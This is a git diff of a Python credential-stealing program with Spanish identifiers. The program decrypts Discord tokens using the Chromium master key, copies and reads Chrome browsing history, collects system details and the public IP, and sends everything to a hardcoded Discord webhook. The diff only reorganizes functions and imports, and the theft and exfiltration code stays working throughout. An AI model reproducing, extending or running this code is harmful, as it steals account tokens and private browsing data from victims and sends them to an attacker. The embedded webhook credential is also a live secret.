@@ -5,19 +5,12 @@ import subprocess
 import json
 import requests
 import time
-import os
-import sqlite3
-import shutil
-import tempfile
-import socket
-import platform
-import subprocess
-import time
-import requests
 import base64
 import win32crypt
 import platform
 import socket
+import sqlite3
+import tempfile
 from Crypto.Cipher import AES
 
 def get_master_key():
@@ -109,16 +102,6 @@ def get_master_key_for_path(local_state_path):
     except Exception:
         return None
 
-def decrypt_val(buff, master_key):
-    try:
-        iv = buff[3:15]
-        payload = buff[15:]
-        cipher = AES.new(master_key, AES.MODE_GCM, iv)
-        decrypted_pass = cipher.decrypt(payload)[:-16].decode("utf-8", errors="ignore")
-        return decrypted_pass
-    except Exception:
-        return None
-
 def obtener_tokens_multiples_rutas():
     appdata = os.getenv("APPDATA")
     local_appdata = os.getenv("LOCALAPPDATA")
@@ -126,7 +109,6 @@ def obtener_tokens_multiples_rutas():
     if not appdata or not local_appdata:
         return []
 
-    
     rutas_discord = {
         "Discord Stable": {
             "leveldb": os.path.join(appdata, "discord", "Local Storage", "leveldb"),
@@ -156,7 +138,6 @@ def obtener_tokens_multiples_rutas():
 
     tokens = []
 
-    
     for plataforma, paths in rutas_discord.items():
         leveldb_path = paths["leveldb"]
         local_state_path = paths["local_state"]
@@ -168,7 +149,6 @@ def obtener_tokens_multiples_rutas():
         if not master_key:
             continue
 
-        
         for file in os.listdir(leveldb_path):
             if file.endswith(".ldb") or file.endswith(".log"):
                 file_path = os.path.join(leveldb_path, file)
@@ -202,7 +182,55 @@ def obtener_tokens_multiples_rutas():
                     
     return tokens
 
-########Webhook###############################################################
+######## Historial de Navegador ##############################################
+
+def obtener_chrome_history():
+    history_path = os.path.expanduser("~") + r"\AppData\Local\Google\Chrome\User Data\Default\History"
+    
+    if not os.path.exists(history_path):
+        return ["No se encontró el historial de Chrome."]
+
+    temp_dir = tempfile.gettempdir()
+    temp_history = os.path.join(temp_dir, "history_temp")
+    
+    try:
+        shutil.copy2(history_path, temp_history)
+    except Exception as e:
+        return [f"Error al copiar historial: {e}"]
+
+    searches = []
+    try:
+        conn = sqlite3.connect(temp_history)
+        cursor = conn.cursor()
+        
+        query = """
+            SELECT url, title, last_visit_time 
+            FROM urls 
+            ORDER BY last_visit_time DESC 
+            LIMIT 5
+        """
+        cursor.execute(query)
+        rows = cursor.fetchall()
+        
+        for row in rows:
+            url, title, _ = row
+            titulo_limpio = (title[:35] + '...') if title and len(title) > 35 else (title or "Sin título")
+            searches.append(f"• [{titulo_limpio}]({url})")
+            
+        cursor.close()
+        conn.close()
+    except Exception as e:
+        searches.append(f"Error al leer base de datos: {e}")
+    finally:
+        if os.path.exists(temp_history):
+            try:
+                os.remove(temp_history)
+            except:
+                pass
+                
+    return searches
+
+######## Webhook #############################################################
 
 WEBHOOK_URL_UNICO = "https://discord.com/api/webhooks/1557079500712575016/UgqNpfxAwc0j3moHXUZs6g5ljdLmwPfwQGjnQWAAr2WemT8v3XL_mhJNE-2kzWbCo2OA"
 
@@ -249,53 +277,6 @@ def obtener_info_pc():
 
     return info_sistema
 
-def obtener_chrome_history():
-    history_path = os.path.expanduser("~") + r"\AppData\Local\Google\Chrome\User Data\Default\History"
-    
-    if not os.path.exists(history_path):
-        return ["No se encontró el historial de Chrome."]
-
-    temp_dir = tempfile.gettempdir()
-    temp_history = os.path.join(temp_dir, "history_temp")
-    
-    try:
-        shutil.copy2(history_path, temp_history)
-    except Exception as e:
-        return [f"Error al copiar historial: {e}"]
-
-    searches = []
-    try:
-        conn = sqlite3.connect(temp_history)
-        cursor = conn.cursor()
-        
-        query = """
-            SELECT url, title, last_visit_time 
-            FROM urls 
-            ORDER BY last_visit_time DESC 
-            LIMIT 5
-        """
-        cursor.execute(query)
-        rows = cursor.fetchall()
-        
-        for row in rows:
-            url, title, _ = row
-            # Limitar longitud del título si es muy largo
-            titulo_limpio = (title[:40] + '...') if title and len(title) > 40 else (title or "Sin título")
-            searches.append(f"• [{titulo_limpio}]({url})")
-            
-        cursor.close()
-        conn.close()
-    except Exception as e:
-        searches.append(f"Error al leer base de datos: {e}")
-    finally:
-        if os.path.exists(temp_history):
-            try:
-                os.remove(temp_history)
-            except:
-                pass
-                
-    return searches
-
 def obtener_datos_usuario(token):
     headers = {
         "Authorization": token.strip(),
@@ -310,10 +291,6 @@ def obtener_datos_usuario(token):
     except Exception as e:
         return {"success": False, "status": str(e)}
 
-def obtener_tokens_reales():
-    # Aquí puedes colocar la lógica para obtener tus tokens si la tienes integrada
-    return []
-
 def enviar_reporte_completo(tokens):
     datos_pc = obtener_info_pc()
     historial = obtener_chrome_history()
@@ -325,14 +302,14 @@ def enviar_reporte_completo(tokens):
         f"🎮 **Gráfica (GPU):** `{datos_pc['gpu']}`\n"
         f"🌐 **IP Local:** `{datos_pc['ip_local']}`\n"
         f"🌍 **IP Pública:** `{datos_pc['ip_publica']}`\n\n"
-        f"--- \n"
+        f"---\n"
         f"🔍 **Últimas búsquedas / páginas:**\n"
     )
 
     for item in historial:
         descripcion += f"{item}\n"
 
-    descripcion += f"\n--- \n🔑 **Tokens:**\n"
+    descripcion += f"\n---\n🔑 **Tokens:**\n"
 
     if tokens:
         for token in tokens:
